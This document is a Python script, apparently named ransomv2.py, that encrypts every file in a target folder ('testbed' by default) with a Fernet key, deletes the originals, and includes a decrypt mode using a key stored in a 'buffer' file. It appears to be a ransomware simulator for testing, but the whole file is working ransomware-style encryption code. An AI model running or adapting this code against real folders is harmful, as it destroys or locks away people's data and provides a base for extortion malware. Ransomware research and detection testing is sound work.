import os
import sys
import argparse
from cryptography.fernet import Fernet, InvalidToken
import shutil

def encrypt_and_delete_original(file, key, testbed, buffer_file):
    if file == buffer_file or file == "decrypt.py" or file == "ransomv2.py" or file == buffer_file:
        return

    file_path = os.path.join(testbed, file)

    # Create a duplicate of the original file with "1" appended to the name
    base_name, extension = os.path.splitext(file)
    duplicate_path = os.path.join(testbed, f"{base_name}1{extension}")
    shutil.copy2(file_path, duplicate_path)

    # Encrypt the duplicate file
    with open(duplicate_path, "rb") as thefile:
        contents = thefile.read()

    contents_encrypted = Fernet(key).encrypt(contents)

    with open(duplicate_path, "wb") as thefile:
        thefile.write(contents_encrypted)

    # Delete the original file
    os.remove(file_path)

    # Rename the encrypted copy to the original file name
    os.rename(duplicate_path, file_path)

def decrypt_files(files, key, testbed):
    for file in files:
        file_path = os.path.join(testbed, file)
        with open(file_path, "rb") as thefile:
            contents = thefile.read()
        try:
            contents_decrypted = Fernet(key).decrypt(contents)
            with open(file_path, "wb") as thefile:
                thefile.write(contents_decrypted)
        except InvalidToken:
            print("Failed to decrypt {file}.")

def main():
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('--mode', help='[encrypt|decrypt] -> default "encrypt"', default='encrypt')
        parser.add_argument('--testbed', help='folder to modify -> default "testbed"', default='testbed')
        parser.add_argument('--buffer_file', help='metadata file used for restoring filesytem -> default "buffer"', default='buffer')

        args = parser.parse_args()

        # Set the current working directory to the directory where the executable is located
        os.chdir(sys._MEIPASS) if getattr(sys, 'frozen', False) else os.chdir(os.path.dirname(os.path.abspath(__file__)))

        testbed = os.path.abspath(args.testbed)
        buffer_file = os.path.abspath(args.buffer_file)

        # Check if the buffer file exists, and create it if not
        if not os.path.exists(buffer_file):
            key = Fernet.generate_key()
            with open(buffer_file, "wb") as thekey:
                thekey.write(key)
            print(f"Buffer file '{buffer_file}' created with a new key.")


        files = [f for f in os.listdir(testbed) if os.path.isfile(os.path.join(testbed, f))]

        key_file = buffer_file
        if args.mode == "encrypt":
            key = Fernet.generate_key()
            with open(key_file, "wb") as thekey:
                thekey.write(key)
            for file in files:
                encrypt_and_delete_original(file, key, testbed, buffer_file)
        elif args.mode == "decrypt":
            with open(key_file, "rb") as key_file:
                secretKey = key_file.read()
                decrypt_files(files, secretKey, testbed)
                print("Files decrypted\n")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        sys.exit(2)

if __name__ == "__main__":
    main()